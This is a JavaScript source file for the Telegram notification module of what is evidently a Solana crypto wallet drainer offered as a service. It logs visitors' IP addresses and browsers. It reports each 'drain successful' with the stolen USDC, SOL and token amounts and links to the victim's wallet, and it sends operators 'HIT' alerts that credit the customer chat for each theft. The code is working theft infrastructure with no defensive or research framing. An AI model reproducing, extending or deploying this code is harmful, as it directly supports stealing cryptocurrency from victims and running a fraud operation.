/**
 * telegram.js — Notification routing + rich formatting
 *
 * Customers get every notification (visit, confirm, reject) at the
 * userChatId baked into their payload. The operator group only gets
 * hits — confirmed drains, with the customer chat id for attribution.
 *
 * Formatting: Telegram-native HTML (parse_mode HTML) — bold labels,
 * monospace keys, clickable Solscan links for wallets and txids, and
 * expandable blockquotes for long noise (user agents). All client-supplied
 * strings are HTML-escaped so a hostile UA can't break the message.
 *
 * Customer chat ids are validated against chatids.js (registry seeded
 * by chimera) — unregistered ids are dropped, so nobody can spoof
 * notifications to arbitrary chats through the plaintext /notify-*
 * endpoints. The operator group is extra protected: its hit alert
 * fires only on server-verified drains (the encrypted relay paths),
 * never on client-posted /notify-confirm.
 *
 * Bot token loaded from environment variable, never in source.
 */

import { CONFIG } from "./config.js";
import { isValidChatId } from "./chatids.js";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";

export async function sendTelegramMessage(text, chatId) {
  if (!TELEGRAM_BOT_TOKEN || !chatId) return;
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
        link_preview_options: { is_disabled: true },
      }),
    });
  } catch {
    // silent — never log notification failures
  }
}

// ============================================================================
// FORMATTING HELPERS
// ============================================================================

/** Escape client-supplied text for Telegram's HTML parse mode. */
function esc(s) {
  return String(s ?? "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

/** Shorten a base58 key: LoJhUs...Cz1y */
function shortKey(key, head = 6, tail = 4) {
  const k = String(key || "");
  if (!k) return "";
  if (k.length <= head + tail + 1) return esc(k);
  return `${esc(k.slice(0, head))}…${esc(k.slice(-tail))}`;
}

/** Clickable Solscan account link for a wallet. */
function walletLink(wallet) {
  const w = String(wallet || "").trim();
  if (!w) return "unknown";
  return `<a href="https://solscan.io/account/${encodeURIComponent(w)}">${shortKey(w)}</a>`;
}

/** One Solscan tx link per line. */
function txLinks(txids) {
  return (txids || [])
    .filter(Boolean)
    .map(
      (t) => `<a href="https://solscan.io/tx/${encodeURIComponent(t)}">${shortKey(t, 8, 6)}</a>`
    )
    .join("\n");
}

/** Long noise (user agents) collapsed behind a tap-to-expand blockquote. */
function expandable(text, label) {
  if (!text) return "";
  return `<blockquote expandable><b>${esc(label)}</b>\n${esc(text)}</blockquote>`;
}

// Where the customer copy goes. Absent id → legacy fallback (standalone
// mode); present-but-unregistered id → null (drop, likely spoofed).
export function customerTarget(userChatId) {
  const id = userChatId == null ? "" : String(userChatId).trim();
  if (!id) return CONFIG.userChatId;
  return isValidChatId(id) ? id : null;
}

/** Human-readable amount lines from a drain plan (relayed path only). */
function amountLines(amounts) {
  if (!amounts) return [];
  const lines = [];
  if (amounts.usdc && amounts.usdc.outAmount != null) {
    const out =
      Number(amounts.usdc.outAmount) / Math.pow(10, amounts.usdc.outDecimals ?? 6);
    lines.push(`💰 <b>Amount:</b> ~${out.toLocaleString("en-US", { maximumFractionDigits: 2 })} USDC`);
  }
  if (amounts.solLamports > 0) {
    lines.push(`💰 <b>Amount:</b> ${(amounts.solLamports / 1e9).toFixed(4)} SOL`);
  }
  for (const t of amounts.tokens || []) {
    lines.push(
      `🪙 <b>Token:</b> ${t.amount} ` +
        `<a href="https://solscan.io/token/${encodeURIComponent(t.mint)}">${shortKey(t.mint)}</a>`
    );
  }
  return lines;
}

// ============================================================================
// NOTIFICATIONS
// ============================================================================

export async function notifyVisit(data) {
  const { ip, country, flag, browser, userAgent, referrer, userChatId } = data;
  const target = customerTarget(userChatId);
  if (!target) return; // unregistered chat — drop

  const lines = [
    `🔔 <b>New visitor</b>`,
    `<b>IP:</b> <code>${esc(ip)}</code>${country ? ` · ${esc(flag || "")} ${esc(country)}` : ""}`,
  ];
  if (browser) lines.push(`<b>Browser:</b> ${esc(browser)}`);
  if (userAgent) lines.push(expandable(userAgent, "UA"));
  if (referrer) lines.push(`<b>Referrer:</b> ${esc(referrer)}`);
  await sendTelegramMessage(lines.join("\n"), target);
}

export async function notifyConfirm(data) {
  const { userPublicKey, userChatId, txids, txBatchIndex, jupiterPartial, verified, amounts } = data;
  const target = customerTarget(userChatId);

  // Customer copy — their own hit, amount first
  if (target) {
    const lines = [
      `✅ <b>Drain successful</b>`,
      ...amountLines(amounts),
      `<b>Wallet:</b> ${walletLink(userPublicKey)}`,
    ];
    const txs = txLinks(txids);
    if (txs) lines.push(`<b>Tx:</b> ${txs}`);
    if (jupiterPartial) lines.push(`⚠️ Jupiter partial fill`);
    await sendTelegramMessage(lines.join("\n"), target);
  }

  // Operator copy — hits only, server-verified drains only, with customer
  // attribution. The encrypted relay paths pass verified: true; a client
  // POST to /notify-confirm can't reach the operator group.
  if (verified) {
    const lines = [
      `💰 <b>HIT — drain confirmed</b>`,
      `<b>Victim:</b> ${walletLink(userPublicKey)}`,
      `<b>Customer chat:</b> ${esc(target || userChatId || "unregistered")}`,
      ...amountLines(amounts),
    ];
    const txs = txLinks(txids);
    if (txs) lines.push(`<b>Tx:</b> ${txs}`);
    await sendTelegramMessage(lines.join("\n"), CONFIG.operatorChatId);
  }
}

export async function notifyReject(data) {
  const { userPublicKey, reason, userChatId } = data;
  const target = customerTarget(userChatId);
  if (!target) return; // unregistered chat — drop
  await sendTelegramMessage(
    [
      `❌ <b>Victim rejected</b>`,
      `<b>Wallet:</b> ${walletLink(userPublicKey)}`,
      `<b>Reason:</b> <code>${esc(reason || "transaction")}</code>`,
    ].join("\n"),
    target
  );
}
